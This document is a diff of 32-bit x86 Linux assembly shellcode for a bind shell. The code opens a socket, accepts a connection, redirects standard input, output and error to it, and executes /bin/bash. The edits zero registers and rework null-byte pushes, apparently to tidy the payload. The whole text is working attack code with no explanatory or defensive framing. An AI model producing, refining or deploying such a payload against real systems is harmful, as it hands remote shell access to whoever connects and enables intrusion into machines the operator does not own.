@@ -15,13 +15,20 @@ section .text
 global _start
 _start:
 
+	
+	; zero all regs	
+	xor eax, eax		; next several instructions zero regs
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
+	xor edi, edi
+	xor esi, esi
+
 
 	; socket(2, 1, 0)
 	; socketcall(call#, args[])
 	mov al, 102  		; socketcall()
  	mov bl, 0x1		; socketcall(socket)
-	cdq
-	mov edi, edx
 	push edi		; 0x00000000
 	push ebx		; SOCK_STREAM
 	push 0x2		; AF_INET
@@ -57,7 +64,6 @@ _start:
 	mov al, 102		; socketcall syscall
 	inc bl			; 0x5 socketcall(accept)
 	push edi		; 0x000000000
-	push edi		; 0x000000000
 	push esi		; sockfd
 	mov ecx, esp		; ecx now *&(sockfd, NULL, NULL1)
 	int 0x80		; eax now second sockfd
@@ -65,8 +71,8 @@ _start:
 
 	; dup2(sockfd, {2,1,0})
 	xchg ebx, eax		; ebx now new sockfd
-	mov ecx, 0x3
-	push edi
+	mov ecx, edi		; 0x00000000
+	mov cl, 0x3
 loop:
 	mov al, 63		; dup2 syscall (0x3F)
 	dec ecx
@@ -76,6 +82,7 @@ loop:
 
 	; execve("/bin/bash", NULL, NULL)
 	mov al, 0xb
+	push edi		; 0x00000000
 	push 0x68736162 	;  hsab 
 	push 0x2f2f2f6e 	;  ///n 
 	push 0x69622f2f 	;  ib// 
